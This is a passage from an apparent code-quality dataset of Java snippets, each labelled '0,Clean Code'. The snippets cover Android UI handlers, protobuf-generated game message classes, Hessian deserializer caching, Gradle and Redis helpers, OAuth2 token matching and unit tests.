 * Compute the amount to scroll in the Y direction in order to get a rectangle completely on the screen (or, if taller than the screen, at least the first screen size chunk of it).
 * @param rect The rect.
 * @return The scroll delta.
 */
protected int computeScrollDeltaToGetChildRectOnScreenV(Rect rect){
  if (getChildCount() == 0)   return 0;
  int height=getHeight();
  int screenTop=getScrollY();
  int screenBottom=screenTop + height;
  int fadingEdge=getVerticalFadingEdgeLength();
  if (rect.top > 0) {
    screenTop+=fadingEdge;
  }
  if (rect.bottom < getChildAt(0).getHeight()) {
    screenBottom-=fadingEdge;
  }
  int scrollYDelta=0;
  if (rect.bottom > screenBottom && rect.top > screenTop) {
    if (rect.height() > height) {
      scrollYDelta+=(rect.top - screenTop);
    }
 else {
      scrollYDelta+=(rect.bottom - screenBottom);
    }
    int bottom=getChildAt(0).getBottom();
    int distanceToBottom=bottom - screenBottom;
    scrollYDelta=Math.min(scrollYDelta,distanceToBottom);
  }
 else   if (rect.top < screenTop && rect.bottom < screenBottom) {
    if (rect.height() > height) {
      scrollYDelta-=(screenBottom - rect.bottom);
    }
 else {
      scrollYDelta-=(screenTop - rect.top);
    }
    scrollYDelta=Math.max(scrollYDelta,-getScrollY());
  }
  return scrollYDelta;
}",0,Clean Code
"@Override public BattleRelic copyFrom(final BattleRelic other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    id=other.id;
    level=other.level;
    mainAffixId=other.mainAffixId;
    uniqueId=other.uniqueId;
    subAffixList.copyFrom(other.subAffixList);
  }
  return this;
}",0,Clean Code
"/** 
 * <code>repeated .FriendRecommendInfo friend_recommend_list = 9;</code>
 * @return this
 */
public GetFriendRecommendListInfoScRsp clearFriendRecommendList(){
  bitField0_&=~0x00000002;
  friendRecommendList.clear();
  return this;
}",0,Clean Code
"/** 
 * Returns the deserializer for a class.
 * @param cl the class of the object that needs to be deserialized.
 * @return a deserializer object for the serialization.
 */
public Deserializer getDeserializer(Class cl) throws HessianProtocolException {
  Deserializer deserializer;
  if (_cachedDeserializerMap != null) {
    deserializer=(Deserializer)_cachedDeserializerMap.get(cl);
    if (deserializer != null)     return deserializer;
  }
  deserializer=loadDeserializer(cl);
  if (_cachedDeserializerMap == null)   _cachedDeserializerMap=new ConcurrentHashMap(8);
  _cachedDeserializerMap.put(cl,deserializer);
  return deserializer;
}
/** 
 * Returns a deserializer based on a string type.
 */
public Deserializer getDeserializer(String type) throws HessianProtocolException {
  if (type == null || type.equals(""""))   return null;
  Deserializer deserializer;
  if (_cachedTypeDeserializerMap != null) {
synchronized (_cachedTypeDeserializerMap) {
      deserializer=(Deserializer)_cachedTypeDeserializerMap.get(type);
    }
    if (deserializer != null)     return deserializer;
  }
  deserializer=(Deserializer)_staticTypeMap.get(type);
  if (deserializer != null)   return deserializer;
  if (type.startsWith(""["")) {
    Deserializer subDeserializer=getDeserializer(type.substring(1));
    if (subDeserializer != null)     deserializer=new ArrayDeserializer(subDeserializer.getType());
 else     deserializer=new ArrayDeserializer(Object.class);
  }
 else {
    try {
      Class cl;
      if (type.startsWith(""com.caucho.hessian"")) {
        cl=this.getClass().getClassLoader().loadClass(type);
      }
 else {
        cl=loadSerializedClass(type);
      }
      deserializer=getDeserializer(cl);
    }
 catch (    Exception e) {
      log.warning(""Hessian/Burlap: '"" + type + ""' is an unknown class in ""+ getClassLoader()+ "":\n""+ e);
      log.log(Level.FINER,e.toString(),e);
    }
  }
  if (deserializer != null) {
    if (_cachedTypeDeserializerMap == null)     _cachedTypeDeserializerMap=new HashMap(8);
synchronized (_cachedTypeDeserializerMap) {
      _cachedTypeDeserializerMap.put(type,deserializer);
    }
  }
  return deserializer;
}",0,Clean Code
"@Nullable private GradleDependencyConfiguration constraintConfiguration(GradleDependencyConfiguration config){
  String constraintConfigName=config.getName();
switch (constraintConfigName) {
case ""compileClasspath"":
case ""compileOnly"":
case ""compile"":
    constraintConfigName=""implementation"";
  break;
case ""runtimeClasspath"":
case ""runtime"":
constraintConfigName=""runtimeOnly"";
break;
case ""testCompileClasspath"":
case ""testCompile"":
constraintConfigName=""testImplementation"";
break;
case ""testRuntimeClasspath"":
case ""testRuntime"":
constraintConfigName=""testRuntimeOnly"";
break;
}
GradleDependencyConfiguration configuration=gradleProject.getConfiguration(constraintConfigName);
if (configuration != null && configuration.isTransitive()) {
return configuration;
}
return null;
}
",0,Clean Code
"@Test public void verifyAndRepairParentWorkflow(){
  WorkflowModel workflow=new WorkflowModel();
  workflow.setWorkflowId(""abcd"");
  workflow.setParentWorkflowId(""parentWorkflowId"");
  when(properties.getWorkflowOffsetTimeout()).thenReturn(Duration.ofSeconds(10));
  when(executionDAO.getWorkflow(""abcd"",true)).thenReturn(workflow);
  when(queueDAO.containsMessage(anyString(),anyString())).thenReturn(false);
  workflowRepairService.verifyAndRepairWorkflowTasks(""abcd"");
  verify(queueDAO,times(1)).containsMessage(anyString(),anyString());
  verify(queueDAO,times(1)).push(anyString(),anyString(),anyLong());
}",0,Clean Code
"@Override public ChessRogueNousSubStoryInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"public AzureOpenAiStreamClient.Builder apiKey(String apiKeyValue){
  this.apiKey=apiKeyValue;
  return this;
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent event){
  if (tabs == null || bounds == null)   return false;
  int index=-1;
  for (int i=0; i < bounds.length; ++i) {
    if (bounds[i].contains(event.getX(),event.getY())) {
      index=i;
      break;
    }
  }
  if (index >= 0 && index != lastPressedIndex) {
    lastPressedIndex=index;
    if (onTabClick != null) {
      onTabClick.run(index);
    }
  }
  if (event.getAction() == MotionEvent.ACTION_UP || event.getAction() == MotionEvent.ACTION_CANCEL) {
    lastPressedIndex=-1;
  }
  if (event.getAction() == MotionEvent.ACTION_DOWN && index >= 0) {
    return true;
  }
  return super.onTouchEvent(event);
}",0,Clean Code
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  m=m.withLeadingAnnotations(withNewlines(m.getLeadingAnnotations()));
  if (!m.getLeadingAnnotations().isEmpty()) {
    if (!m.getModifiers().isEmpty()) {
      m=m.withModifiers(withNewline(m.getModifiers()));
    }
 else     if (m.getAnnotations().getTypeParameters() != null) {
      if (!m.getAnnotations().getTypeParameters().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.getAnnotations().withTypeParameters(m.getAnnotations().getTypeParameters().withPrefix(withNewline(m.getAnnotations().getTypeParameters().getPrefix())));
      }
    }
 else     if (m.getReturnTypeExpression() != null) {
      if (!m.getReturnTypeExpression().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withReturnTypeExpression(m.getReturnTypeExpression().withPrefix(withNewline(m.getReturnTypeExpression().getPrefix())));
      }
    }
 else {
      if (!m.getName().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withName(m.getName().withPrefix(withNewline(m.getName().getPrefix())));
      }
    }
  }
  return m;
}
",0,Clean Code
"@Override public Builder toBuilder(){
  return this == DEFAULT_INSTANCE ? new Builder() : new Builder().mergeFrom(this);
}
",0,Clean Code
"public static RotatorEnergyInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),data).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
",0,Clean Code
"public Builder userName(String userName){
  this.userName=userName;
  return this;
}
",0,Clean Code
"public ConverterImpl(Type firstTargetType,Type secondTargetType){
  this.firstTargetType=firstTargetType;
  this.secondTargetType=secondTargetType;
}
",0,Clean Code
"/** 
 * <code>repeated .HeroBasicTypeInfo basic_type_info_list = 9;</code>
 * @return this
 */
public GetHeroBasicTypeInfoScRsp clearBasicTypeInfoList(){
  bitField0_&=~0x00000008;
  basicTypeInfoList.clear();
  return this;
}",0,Clean Code
"@Test void should_split_sample_text_without_paragraphs(){
  int maxSegmentSize=100;
  Tokenizer tokenizer=new OpenAiTokenizer(GPT_3_5_TURBO);
  String segment1=""In a small town nestled between two vast mountains, there was a shop unlike any other. "" + ""A unique haven. "" + ""Visitors would often comment on its peculiar charm, always slightly different from what they ""+ ""remembered on their previous visits. ""+ ""The store stood as a testament to the passage of time and the ever-changing landscape of tales. ""+ ""Upon entering, the first thing to strike you was the enormity of it all. ""+ ""Every inch of space was occupied with books."";
  String segment2=""Some stood tall and regal on the highest shelves, "" + ""looking as if they had witnessed epochs come and go. "" + ""They were leather-bound, with pages yellowed by age. ""+ ""Others, smaller and brightly adorned, were reminiscent of summer days and childhood laughter. ""+ ""But these physical objects were mere vessels. ""+ ""It was the stories inside that held power. ""+ ""Mrs. Jenkins ran the shop. ""+ ""A mystery in her own right."";
  String segment3=""Her silver hair cascaded like a waterfall, and her eyes seemed to see more than most. "" + ""With just a glance, she'd find the perfect story for you. "" + ""One wet afternoon, Eli entered. ""+ ""He was just a boy, lost in the vastness of the store. ""+ ""Between the aisles, his small fingers danced on the spines of books, feeling the heartbeat of ""+ ""countless tales. ""+ ""Then, a simple brown-covered book whispered to him."";
  String segment4=""Without grandeur or pretense, it beckoned. "" + ""And he listened. "" + ""He read. ""+ ""And read. ""+ ""The world around him melted. ""+ ""When Mrs. Jenkins approached, night had fallen. ""+ ""She gently remarked, \""Books have a way of finding their reader.\"" ""+ ""Eli simply nodded, understanding the profound truth in her words. ""+ ""Some places and stories remain etched in our souls, offering lessons and moments of sheer wonder. ""+ ""They defy definition."";
  Document document=Document.from(format(""%s %s %s %s"",segment1,segment2,segment3,segment4),metadata(""document"",""0""));
  DocumentSplitter splitter=new DocumentByParagraphSplitter(maxSegmentSize,0,tokenizer);
  List<TextSegment> segments=splitter.split(document);
  segments.forEach(segment -> assertThat(tokenizer.estimateTokenCountInText(segment.text())).isLessThanOrEqualTo(maxSegmentSize));
  assertThat(segments).containsExactly(textSegment(segment1,metadata(""index"",""0"").add(""document"",""0"")),textSegment(segment2,metadata(""index"",""1"").add(""document"",""0"")),textSegment(segment3,metadata(""index"",""2"").add(""document"",""0"")),textSegment(segment4,metadata(""index"",""3"").add(""document"",""0"")));
}",0,Clean Code
"public static int[] calcDrawableColor(Drawable drawable){
  int bitmapColor=0xff000000;
  int[] result=new int[4];
  try {
    if (drawable instanceof BitmapDrawable) {
      Bitmap bitmap=((BitmapDrawable)drawable).getBitmap();
      bitmapColor=calcBitmapColor(bitmap);
    }
 else     if (drawable instanceof ColorDrawable) {
      bitmapColor=((ColorDrawable)drawable).getColor();
    }
 else     if (drawable instanceof BackgroundGradientDrawable) {
      int[] colors=((BackgroundGradientDrawable)drawable).getColorsList();
      if (colors != null) {
        if (colors.length > 1) {
          bitmapColor=getAverageColor(colors[0],colors[1]);
        }
 else         if (colors.length > 0) {
          bitmapColor=colors[0];
        }
      }
    }
 else     if (drawable instanceof MotionBackgroundDrawable) {
      result[0]=result[2]=Color.argb(0x2D,0,0,0);
      result[1]=result[3]=Color.argb(0x3D,0,0,0);
      return result;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  double[] hsv=rgbToHsv((bitmapColor >> 16) & 0xff,(bitmapColor >> 8) & 0xff,bitmapColor & 0xff);
  hsv[1]=Math.min(1.0,hsv[1] + 0.05 + 0.1 * (1.0 - hsv[1]));
  double v=Math.max(0,hsv[2] * 0.65);
  int[] rgb=hsvToRgb(hsv[0],hsv[1],v);
  result[0]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[1]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  double v2=Math.max(0,hsv[2] * 0.72);
  rgb=hsvToRgb(hsv[0],hsv[1],v2);
  result[2]=Color.argb(0x66,rgb[0],rgb[1],rgb[2]);
  result[3]=Color.argb(0x88,rgb[0],rgb[1],rgb[2]);
  return result;
}",0,Clean Code
"@Override public List<StreamEntry> xclaim(String key,String group,String consumername,long minIdleTime,long newIdleTime,int retries,boolean force,StreamEntryID... ids){
  return executeInJedis(jedis -> jedis.xclaim(key,group,consumername,minIdleTime,newIdleTime,retries,force,ids));
}
",0,Clean Code
"private void createContactButtons(){
  if (Build.VERSION.SDK_INT >= 21) {
    createSelectorDrawable(0);
  }
  if (drawContact) {
    int needDrawFlag=0;
    int buttonsCount=0;
    if (drawContactView) {
      needDrawFlag|=1;
      buttonsCount++;
    }
    if (drawContactSendMessage) {
      needDrawFlag|=2;
      buttonsCount++;
    }
    if (drawContactAdd) {
      needDrawFlag|=4;
      buttonsCount++;
    }
    if (buttonsCount == 0) {
      contactButtons=null;
      drawnContactButtonsFlag=0;
      return;
    }
    totalHeight+=AndroidUtilities.dp(60);
    boolean needRecreate=needDrawFlag != drawnContactButtonsFlag;
    if (needRecreate) {
      drawnContactButtonsFlag=0;
      int mWidth=(backgroundWidth - AndroidUtilities.dp(10 + 24 + 10+ 31)) / buttonsCount;
      float parentWidth=(backgroundWidth - AndroidUtilities.dpf2(37)) / buttonsCount;
      if (contactButtons == null) {
        contactButtons=new ArrayList<>(buttonsCount);
      }
 else {
        contactButtons.clear();
      }
      if (drawContactView) {
        drawnContactButtonsFlag|=1;
        String str=LocaleController.getString(""ViewContact"",R.string.ViewContact);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_VIEW,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactSendMessage) {
        drawnContactButtonsFlag|=2;
        String str=LocaleController.getString(""SharedContactMessage"",R.string.SharedContactMessage);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_SEND_MESSAGE,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
      if (drawContactAdd) {
        drawnContactButtonsFlag|=4;
        String str=LocaleController.getString(""SharedContactAdd"",R.string.SharedContactAdd);
        InstantViewButton instantViewButton=createInstantViewButton(INSTANT_BUTTON_TYPE_CONTACT_ADD,str,mWidth,parentWidth);
        contactButtons.add(instantViewButton);
      }
    }
  }
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_undo) {
    if (mEditor != null && mEditor.canUndo()) {
      mEditor.undo();
      return true;
    }
  }
 else   if (id == R.id.action_redo) {
    if (mEditor != null && mEditor.canRedo()) {
      mEditor.redo();
      return true;
    }
  }
 else   if (id == R.id.action_wrap) {
    if (mEditor != null) {
      mEditor.setWordwrap(!mEditor.isWordwrap());
      return true;
    }
  }
 else   if (id == R.id.action_save) {
    saveFile();
    return true;
  }
 else   if (id == R.id.action_save_as) {
    launchIntentSaver();
    return true;
  }
 else   if (id == R.id.action_share) {
    Path filePath=mViewModel.getSourceFile();
    if (filePath != null) {
      Intent intent=new Intent(Intent.ACTION_SEND).setType(filePath.getType()).putExtra(Intent.EXTRA_STREAM,FmProvider.getContentUri(filePath)).addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
      startActivity(Intent.createChooser(intent,getString(R.string.share)));
    }
    return true;
  }
 else   if (id == R.id.action_java_smali_toggle) {
    mViewModel.generateJava(mEditor.getText());
  }
 else   if (id == R.id.action_search) {
    if (mSearchWidget != null) {
      if (mSearchWidget.getVisibility() == View.VISIBLE) {
        hideSearchWidget();
      }
 else       showSearchWidget();
    }
  }
  return false;
}
",0,Clean Code
"private static String readTextFile(List<String> filePaths){
  if (filePaths == null || filePaths.isEmpty()) {
    return null;
  }
  Log.v(TAG,""all file path : "" + filePaths.toString());
  StringBuilder content=new StringBuilder();
  for (  String filePath : filePaths) {
    if (!TextUtils.isEmpty(filePath)) {
      content=new StringBuilder();
      File file=new File(filePath);
      if (file.isFile()) {
        Log.v(TAG,""available filePath: "" + filePath);
        if (file.isFile()) {
          InputStream inputStream=null;
          InputStreamReader streamReader=null;
          BufferedReader buffreader=null;
          try {
            inputStream=new FileInputStream(file);
            streamReader=new InputStreamReader(inputStream);
            buffreader=new BufferedReader(streamReader);
            String line;
            while ((line=buffreader.readLine()) != null) {
              content.append(line);
              content.append(""\n"");
            }
            if (!TextUtils.isEmpty(content)) {
              break;
            }
          }
 catch (          java.io.FileNotFoundException e) {
            Log.d(TAG,""The File doesn't not exist."");
          }
catch (          IOException e) {
            Log.d(TAG,e.getMessage());
          }
 finally {
            try {
              if (inputStream != null) {
                inputStream.close();
              }
              if (streamReader != null) {
                streamReader.close();
              }
              if (buffreader != null) {
                buffreader.close();
              }
            }
 catch (            IOException ignore) {
            }
          }
        }
      }
    }
  }
  return content.toString();
}
",0,Clean Code
"public KeyUsecaseEntry parse(AnnotationExpr keyUsecase){
  KeyUsecaseEntry entry=new KeyUsecaseEntry(className,methodName);
  entry.setJavadoc(JavaParserUtil.javadocFirstLineOf(methodDeclaration));
  if (keyUsecase instanceof MarkerAnnotationExpr) {
    return entry;
  }
  NormalAnnotationExpr normalAnnotationExpr=(NormalAnnotationExpr)keyUsecase;
  for (  MemberValuePair memberValuePair : normalAnnotationExpr.getPairs()) {
switch (memberValuePair.getNameAsString()) {
case ""name"":
      this.methodName=AnnotationFieldParser.singleFieldValue(memberValuePair);
    entry.setMethodName(this.methodName);
  break;
case ""remark"":
entry.setRemark(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""consumesKeyEvent"":
entry.setKeyEvent(AnnotationFieldParser.singleFieldValue(memberValuePair));
break;
case ""in"":
entry.setIn(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
case ""out"":
entry.setOut(new ArrayList<>(AnnotationFieldParser.arrayFieldValue(memberValuePair)));
break;
}
}
return entry;
}
",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @param other Fallback value in case the value is not known.
 * @return The enum associated with the given numeric wire value, or the fallback value if unknown.
 */
public static DisplayRecordType forNumberOr(int number,DisplayRecordType other){
  DisplayRecordType value=forNumber(number);
  return value == null ? other : value;
}
",0,Clean Code
"/** 
 * <code>optional .SceneBattleInfo battle_info = 14;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public SceneBattleInfoOuterClass.SceneBattleInfo getMutableBattleInfo(){
  bitField0_|=0x00000010;
  return battleInfo;
}",0,Clean Code
"public long getLength(){
  return (Math.abs((end - start) / step)) + 1;
}",0,Clean Code
"public int getSource(){
  return this.source;
}
",0,Clean Code
"@Benchmark public Object fury_deserialize_compatible(FuryState.FuryCompatibleState state){
  state.buffer.readerIndex(0);
  Object o=state.fury.readRef(state.buffer);
  state.fury.resetRead();
  return o;
}",0,Clean Code
"private TableIndexColumn getTableIndexColumn(ResultSet resultSet) throws SQLException {
  TableIndexColumn tableIndexColumn=new TableIndexColumn();
  tableIndexColumn.setColumnName(resultSet.getString(""COLUMN_NAME""));
  tableIndexColumn.setOrdinalPosition(resultSet.getShort(""COLUMN_POSITION""));
  String collation=resultSet.getString(""DESCEND"");
  if (""ASC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""ASC"");
  }
 else   if (""DESC"".equalsIgnoreCase(collation)) {
    tableIndexColumn.setAscOrDesc(""DESC"");
  }
  return tableIndexColumn;
}
",0,Clean Code
"void onResult(int i2,String str,MoveGroupFileResult moveGroupFileResult);",0,Clean Code
"@Override public RogueAction clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  bonusSelectInfo.clearQuick();
  miracleSelectInfo.clearQuick();
  buffSelectInfo.clearQuick();
  return this;
}",0,Clean Code
"@Override public ChessRogueMiracleInfo copyFrom(final ChessRogueMiracleInfo other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    miracleData.copyFrom(other.miracleData);
  }
  return this;
}",0,Clean Code
"public static String queryProjectList(int index){
  return RpcUtil.request(""alipay.antsports.walk.charity.queryProjectList"",""[{\""chInfo\"":\"""" + chInfo + ""\"",\""clientOS\"":\""android\"",\""features\"":[\""DAILY_STEPS_RANK_V2\"",\""STEP_BATTLE\"",\""CLUB_HOME_CARD\"",\""NEW_HOME_PAGE_STATIC\"",\""CLOUD_SDK_AUTH\"",\""STAY_ON_COMPLETE\"",\""EXTRA_TREASURE_BOX\"",\""NEW_HOME_PAGE_STATIC\"",\""SUPPORT_TAB3\"",\""SUPPORT_FLYRABBIT\"",\""PROP\"",\""PROPV2\"",\""ASIAN_GAMES\""],\""index\"":""+ index+ "",\""projectListUseVertical\"":true}]"");
}",0,Clean Code
"@Override public void publish(String subject,byte[] data) throws Exception {
  ensureConnected();
  conn.publish(subject,data);
}
",0,Clean Code
"public Map<String,String> getExternalProperties(){
  return externalProperties;
}
",0,Clean Code
"/** 
 * Joins the elements of the provided  {@code Iterator} intoa single String containing the provided elements.</p> <p/> No delimiter is added before or after the list. A  {@code null} separator is the same as an empty String ("""").</p><p/> Copied from Commons Lang, version 3 (r1138702).</p>
 * @param iterator  the {@code Iterator} of values to join together, may be null
 * @param separator the separator character to use, null treated as """"
 * @return the joined String, {@code null} if null iterator input
 * @since 1.2
 */
public static String join(Iterator<?> iterator,String separator){
  final String empty="""";
  if (iterator == null) {
    return null;
  }
  if (!iterator.hasNext()) {
    return empty;
  }
  Object first=iterator.next();
  if (!iterator.hasNext()) {
    return first == null ? empty : first.toString();
  }
  StringBuilder buf=new StringBuilder(256);
  if (first != null) {
    buf.append(first);
  }
  while (iterator.hasNext()) {
    if (separator != null) {
      buf.append(separator);
    }
    Object obj=iterator.next();
    if (obj != null) {
      buf.append(obj);
    }
  }
  return buf.toString();
}",0,Clean Code
"@Override public Long zlexcount(String key,String min,String max){
  return jedisCluster.zlexcount(key,min,max);
}
",0,Clean Code
"/** 
 * <code>optional uint32 exp = 1;</code>
 * @return this
 */
public RogueHandbookAeon clearExp(){
  bitField0_&=~0x00000001;
  exp=0;
  return this;
}",0,Clean Code
"@Override public void handleTransportError(@NotNull WebSocketSession session,@NotNull Throwable e) throws Exception {
  log.error(""[wss-{}] Transport error"",this.account.getDisplay(),e);
  onFailure(CLOSE_CODE_EXCEPTION,""transport error"");
}
",0,Clean Code
"public static String generateRegular(String raw,int start,int end){
  int newStart=start;
  int newEnd=end;
  String startStr="""";
  String endStr="""";
  String target=raw.substring(start,end);
  String strReg="""";
  if (start > 3) {
    newStart-=3;
  }
 else   if (start > 1) {
    newStart-=1;
  }
  if (end < raw.length() - 3) {
    newEnd+=3;
  }
  for (int i=0; i < raw.length(); i++) {
    startStr=raw.substring(newStart,start);
    startStr=escapeExprSpecialWord(startStr);
    endStr=raw.substring(end,newEnd);
    endStr=escapeExprSpecialWord(endStr);
    strReg=String.format(""%s(.*?)%s"",startStr,endStr);
    System.out.println(""---------------------------------------"");
    System.out.println(strReg);
    BurpExtender.stderr.println(""------------------------------"");
    BurpExtender.stderr.println(""[+] "" + target);
    BurpExtender.stderr.println(strReg);
    if (matchByRegular(raw,strReg).getResult().equals(target)) {
      break;
    }
    if (newStart == 0 && newEnd == raw.length()) {
      break;
    }
    if (newStart > 0) {
      newStart-=1;
    }
    if (newEnd < raw.length()) {
      newEnd+=1;
    }
  }
  return strReg;
}",0,Clean Code
"private static boolean hasToken(OAuth2Authorization authorization,String token,@Nullable OAuth2TokenType tokenType){
  if (tokenType == null) {
    return matchesState(authorization,token) || matchesAuthorizationCode(authorization,token) || matchesAccessToken(authorization,token)|| matchesIdToken(authorization,token)|| matchesRefreshToken(authorization,token)|| matchesDeviceCode(authorization,token)|| matchesUserCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.STATE.equals(tokenType.getValue())) {
    return matchesState(authorization,token);
  }
 else   if (OAuth2ParameterNames.CODE.equals(tokenType.getValue())) {
    return matchesAuthorizationCode(authorization,token);
  }
 else   if (OAuth2TokenType.ACCESS_TOKEN.equals(tokenType)) {
    return matchesAccessToken(authorization,token);
  }
 else   if (OidcParameterNames.ID_TOKEN.equals(tokenType.getValue())) {
    return matchesIdToken(authorization,token);
  }
 else   if (OAuth2TokenType.REFRESH_TOKEN.equals(tokenType)) {
    return matchesRefreshToken(authorization,token);
  }
 else   if (OAuth2ParameterNames.DEVICE_CODE.equals(tokenType.getValue())) {
    return matchesDeviceCode(authorization,token);
  }
 else   if (OAuth2ParameterNames.USER_CODE.equals(tokenType.getValue())) {
    return matchesUserCode(authorization,token);
  }
  return false;
}",0,Clean Code
"/** 
 * <code>optional bool b2 = 8;</code>
 * @param value the b2 to set
 * @return this
 */
public PlayerSettingInfo setB2(final boolean value){
  bitField0_|=0x00000020;
  b2=value;
  return this;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)96);
    output.writeUInt32NoTag(talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)120);
    output.writeEnumNoTag(status);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    for (int i=0; i < unlockProgressList.length(); i++) {
      output.writeRawByte((byte)106);
      output.writeMessageNoTag(unlockProgressList.get(i));
    }
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.talentId,talentId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeEnum(FieldNames.status,status,RogueTalentStatusOuterClass.RogueTalentStatus.converter());
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRepeatedMessage(FieldNames.unlockProgressList,unlockProgressList);
  }
  output.endObject();
}",0,Clean Code
"public void prepare(){
  ArrayList<SamplePresentationTime> original=new ArrayList<>(samplePresentationTimes);
  Collections.sort(samplePresentationTimes,(o1,o2) -> {
    if (o1.presentationTime > o2.presentationTime) {
      return 1;
    }
 else     if (o1.presentationTime < o2.presentationTime) {
      return -1;
    }
    return 0;
  }
);
  long lastPresentationTimeUs=0;
  sampleDurations=new long[samplePresentationTimes.size()];
  long minDelta=Long.MAX_VALUE;
  boolean outOfOrder=false;
  for (int a=0; a < samplePresentationTimes.size(); a++) {
    SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
    long delta=presentationTime.presentationTime - lastPresentationTimeUs;
    lastPresentationTimeUs=presentationTime.presentationTime;
    sampleDurations[presentationTime.index]=delta;
    if (presentationTime.index != 0) {
      duration+=delta;
    }
    if (delta > 0 && delta < Integer.MAX_VALUE) {
      minDelta=Math.min(minDelta,delta);
    }
    if (presentationTime.index != a) {
      outOfOrder=true;
    }
  }
  if (sampleDurations.length > 0) {
    sampleDurations[0]=minDelta;
    duration+=minDelta;
  }
  for (int a=1; a < original.size(); a++) {
    original.get(a).dt=sampleDurations[a] + original.get(a - 1).dt;
  }
  if (outOfOrder) {
    sampleCompositions=new int[samplePresentationTimes.size()];
    for (int a=0; a < samplePresentationTimes.size(); a++) {
      SamplePresentationTime presentationTime=samplePresentationTimes.get(a);
      sampleCompositions[presentationTime.index]=(int)(presentationTime.presentationTime - presentationTime.dt);
    }
  }
}",0,Clean Code
"public int getForceExit(){
  return this.forceExit;
}
",0,Clean Code
"String getGifUrl();
",0,Clean Code
"@Override public Result<List<Map<String,Object>>> queryFieldInfo(Integer label,Long typeId){
  return null;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(battleInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.retcode,retcode);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.battleInfo,battleInfo);
  }
  output.endObject();
}",0,Clean Code
"@AfterAll public static void afterAll(){
  evaluator.close();
}
",0,Clean Code
"private long continueReadVarInt36(int readIdx,long bulkValue,long result){
  readIdx++;
  result|=(bulkValue >>> 2) & 0x1fc000;
  if ((bulkValue & 0x800000) != 0) {
    readIdx++;
    result|=(bulkValue >>> 3) & 0xfe00000;
    if ((bulkValue & 0x80000000L) != 0) {
      readIdx++;
      result|=(bulkValue >>> 4) & 0xff0000000L;
    }
  }
  readerIndex=readIdx;
  return result;
}",0,Clean Code
"public void setAppId(int i2){
  this.appId=i2;
}",0,Clean Code
"public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,boolean isDialog){
  return getTopicSpannedName(topic,paint,null,isDialog);
}
public static CharSequence getTopicSpannedName(TLRPC.ForumTopic topic,Paint paint,Drawable[] drawableToSet,boolean isDialog){
  SpannableStringBuilder sb=new SpannableStringBuilder();
  if (topic instanceof TLRPC.TL_forumTopic) {
    TLRPC.TL_forumTopic forumTopic=(TLRPC.TL_forumTopic)topic;
    if (forumTopic.id == 1) {
      try {
        Drawable drawable=createGeneralTopicDrawable(ApplicationLoader.applicationContext,1f,paint == null ? Theme.getColor(Theme.key_chat_inMenu) : paint.getColor(),isDialog);
        drawable.setBounds(0,0,paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()),paint == null ? AndroidUtilities.dp(14) : (int)(paint.getTextSize()));
        sb.append("" "");
        if (drawableToSet != null) {
          drawableToSet[0]=drawable;
        }
